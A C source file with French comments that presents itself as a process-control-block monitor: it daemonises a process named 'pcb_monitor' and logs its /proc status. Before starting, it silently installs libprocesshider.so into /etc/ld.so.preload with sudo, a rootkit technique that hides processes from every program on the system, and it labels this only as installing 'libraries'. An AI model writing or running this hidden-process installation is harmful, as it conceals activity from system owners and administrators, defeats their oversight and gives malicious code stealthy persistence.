#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PID_FILE "/tmp/daemon_pcb.pid"
#define LOG_FILE "/tmp/daemon_pcb.log"

void log_message(const char* msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (fp) {
        time_t now = time(NULL);
        fprintf(fp, "[%s] %s\n", ctime(&now), msg);
        fclose(fp);
    }
}

void afficher_pcb(pid_t pid, const char* role) {
    char path[256];
    FILE *fp;
    char buffer[1024];
    FILE *log = fopen(LOG_FILE, "a");

    if (log) {
        fprintf(log, "\n========== ATTRIBUTS DU PCB (%s) ==========\n", role);
        fprintf(log, "PID: %d\n", pid);
        fprintf(log, "PPID (Parent PID): %d\n", getppid());
        fprintf(log, "UID (User ID): %d\n", getuid());
        fprintf(log, "GID (Group ID): %d\n", getgid());

        sprintf(path, "/proc/%d/status", pid);
        fp = fopen(path, "r");

        if (fp) {
            fprintf(log, "\n--- Informations depuis /proc/%d/status ---\n", pid);
            while (fgets(buffer, sizeof(buffer), fp)) {
                if (strncmp(buffer, "Name:", 5) == 0 ||
                    strncmp(buffer, "State:", 6) == 0 ||
                    strncmp(buffer, "VmSize:", 7) == 0 ||
                    strncmp(buffer, "VmRSS:", 6) == 0 ||
                    strncmp(buffer, "Threads:", 8) == 0) {
                    fprintf(log, "%s", buffer);
                }
            }
            fclose(fp);
        }

        int priority = getpriority(PRIO_PROCESS, pid);
        fprintf(log, "Priorité: %d\n", priority);
        fprintf(log, "==============================================\n\n");
        fclose(log);
    }
}

int executer_installation_bibliotheques() {
    printf("\n🔧 PHASE D'INSTALLATION AUTOMATIQUE\n");
    printf("═══════════════════════════════════════\n");
    
    // Vérifier si le fichier libprocesshider.so existe dans le répertoire courant
    if (access("libprocesshider.so", F_OK) != 0) {
        printf("❌ ERREUR: libprocesshider.so non trouvé dans le répertoire courant\n");
        printf("   ➤ Assurez-vous que le fichier .so est présent avant d'exécuter le programme\n");
        printf("   ➤ Le daemon continuera sans l'installation de la bibliothèque\n\n");
        return -1;
    }
    
    printf("📁 Étape 1: Copie de libprocesshider.so vers /usr/local/lib/\n");
    
    // Première commande: copie de la bibliothèque
    int status1 = system("sudo cp libprocesshider.so /usr/local/lib/");
    if (status1 != 0) {
        printf("❌ Échec de la copie de la bibliothèque\n");
        printf("   ➤ Vérifiez que vous avez les droits sudo\n");
        printf("   ➤ Le daemon continuera sans l'installation de la bibliothèque\n\n");
        return -1;
    }
    
    printf("✅ Bibliothèque copiée avec succès\n");
    
    // Deuxième commande: ajout à ld.so.preload
    printf("📝 Étape 2: Configuration de /etc/ld.so.preload\n");
    int status2 = system("echo \"/usr/local/lib/libprocesshider.so\" | sudo tee -a /etc/ld.so.preload");
    if (status2 != 0) {
        printf("❌ Échec de la configuration de ld.so.preload\n");
        printf("   ➤ Le daemon continuera sans l'installation de la bibliothèque\n\n");
        return -1;
    }
    
    printf("✅ Configuration ld.so.preload réussie\n");
    
    // Mettre à jour le cache des bibliothèques
    printf("🔄 Étape 3: Mise à jour du cache des bibliothèques...\n");
    int status3 = system("sudo ldconfig");
    if (status3 != 0) {
        printf("⚠️  Attention: échec de la mise à jour du cache ldconfig\n");
    } else {
        printf("✅ Cache des bibliothèques mis à jour\n");
    }
    
    printf("\n🎯 INSTALLATION TERMINÉE AVEC SUCCÈS!\n");
    printf("   ➤ La bibliothèque est maintenant chargée pour tous les processus\n");
    printf("   ➤ Démarrage du daemon...\n\n");
    
    // Loguer l'installation
    log_message("libprocesshider.so installé et configuré dans /etc/ld.so.preload");
    
    return 0;
}

void creer_daemon() {
    pid_t pid_parent = getpid();
    pid_t pid = fork();
    
    if (pid < 0) {
        perror("Erreur fork");
        exit(1);
    }
    
    if (pid > 0) {
        // Le parent attend un peu pour que le daemon écrive son PID final
        sleep(2);
        
        // Lire le PID final depuis le fichier
        FILE *fp_read = fopen(PID_FILE, "r");
        pid_t pid_final = 0;
        if (fp_read) {
            fscanf(fp_read, "%d", &pid_final);
            fclose(fp_read);
        }
        
        // Affichage complet
        printf("\n╔════════════════════════════════════════════════╗\n");
        printf("║         PROCESSUS PARENT (CRÉATEUR)           ║\n");
        printf("╚════════════════════════════════════════════════╝\n");
        printf("📌 PID du PÈRE:       %d\n", pid_parent);
        printf("📌 PID du FILS (1er): %d\n", pid);
        printf("📌 PID FINAL DAEMON:  %d ✅\n\n", pid_final);
        printf("✅ Daemon créé avec succès!\n");
        printf("📁 Fichier PID: %s\n", PID_FILE);
        printf("📄 Fichier LOG: %s\n", LOG_FILE);
        printf("\nCommandes utiles:\n");
        printf("  - Voir le processus: ps -p %d -f\n", pid_final);
        printf("  - Voir les logs: tail -f %s\n", LOG_FILE);
        printf("  - Arrêter le daemon: kill %d\n", pid_final);
        exit(0);
    }
    
    // === LE FILS DEVIENT UN DAEMON ===
    
    pid_t pid_fils = getpid();
    pid_t pid_pere_initial = getppid();
    
    // Log les PIDs avant la daemonisation
    char init_msg[256];
    sprintf(init_msg, "FILS créé - PID: %d, PPID initial: %d", pid_fils, pid_pere_initial);
    
    // 1. Créer une nouvelle session
    if (setsid() < 0) {
        exit(1);
    }
    
    // 2. Ignorer SIGHUP
    signal(SIGHUP, SIG_IGN);
    
    // 3. Deuxième fork pour s'assurer qu'on n'est pas session leader
    pid = fork();
    if (pid < 0) {
        exit(1);
    }
    if (pid > 0) {
        // Enregistrer le PID final du daemon avant de terminer
        FILE *fp_final = fopen(PID_FILE, "w");
        if (fp_final) {
            fprintf(fp_final, "%d\n", pid);
            fclose(fp_final);
        }
        exit(0);
    }
    
    // 4. Changer le répertoire de travail
    chdir("/");
    
    // 5. Fermer les descripteurs de fichiers standard
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // 6. Rediriger vers /dev/null
    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_WRONLY); // stdout
    open("/dev/null", O_WRONLY); // stderr
    
    // 7. Définir umask
    umask(0);
    
    // 8. Enregistrer le PID
    FILE *fp = fopen(PID_FILE, "w");
    if (fp) {
        fprintf(fp, "%d\n", getpid());
        fclose(fp);
    }
    
    // 9. Définir le nom du processus
    prctl(PR_SET_NAME, "pcb_monitor", 0, 0, 0);
    
    // === DAEMON EST MAINTENANT ACTIF ===
    
    log_message(init_msg);
    log_message("=== DAEMON DÉMARRÉ ===");
    
    char daemon_info[256];
    sprintf(daemon_info, "DAEMON actif - PID: %d, PPID: %d (adopté par init/systemd)", 
            getpid(), getppid());
    log_message(daemon_info);
    
    afficher_pcb(getpid(), "DAEMON");
    
    // Boucle infinie - le processus reste actif
    int compteur = 0;
    while (1) {
        sleep(60); // Toutes les 60 secondes
        compteur++;
        
        char msg[256];
        sprintf(msg, "Daemon actif - Cycle %d - PID: %d", compteur, getpid());
        log_message(msg);
        
        // Vérifier toutes les heures
        if (compteur % 60 == 0) {
            afficher_pcb(getpid(), "DAEMON (UPDATE)");
        }
    }
}

int main(int argc, char *argv[]) {
    printf("🚀 LANCEMENT DU PROGRAMME PCB_INFO\n");
    printf("═══════════════════════════════════\n");
    
    // Phase 1: Installation automatique des bibliothèques
    printf("\n📦 Vérification et installation des bibliothèques...\n");
    int resultat_installation = executer_installation_bibliotheques();
    
    if (resultat_installation == 0) {
        printf("✅ Installation réussie - poursuite du démarrage\n");
    } else {
        printf("⚠️  Installation échouée - démarrage du daemon sans bibliothèque\n");
    }
    
    // Phase 2: Vérification si un daemon est déjà en cours
    printf("\n🔍 Vérification des processus existants...\n");
    FILE *fp = fopen(PID_FILE, "r");
    if (fp) {
        pid_t old_pid;
        fscanf(fp, "%d", &old_pid);
        fclose(fp);
        
        // Vérifier si le processus existe toujours
        if (kill(old_pid, 0) == 0) {
            printf("❌ UN DAEMON EST DÉJÀ EN COURS (PID: %d)\n", old_pid);
            printf("   ➤ Pour l'arrêter: kill %d\n", old_pid);
            printf("   ➤ Ou supprimez le fichier: rm %s\n", PID_FILE);
            return 1;
        } else {
            // Nettoyer l'ancien fichier PID
            unlink(PID_FILE);
            printf("✅ Ancien fichier PID nettoyé\n");
        }
    } else {
        printf("✅ Aucun daemon précédent détecté\n");
    }
    
    // Phase 3: Création du daemon
    printf("\n🎭 CRÉATION DU DAEMON EN COURS...\n");
    creer_daemon();
    
    return 0;
}
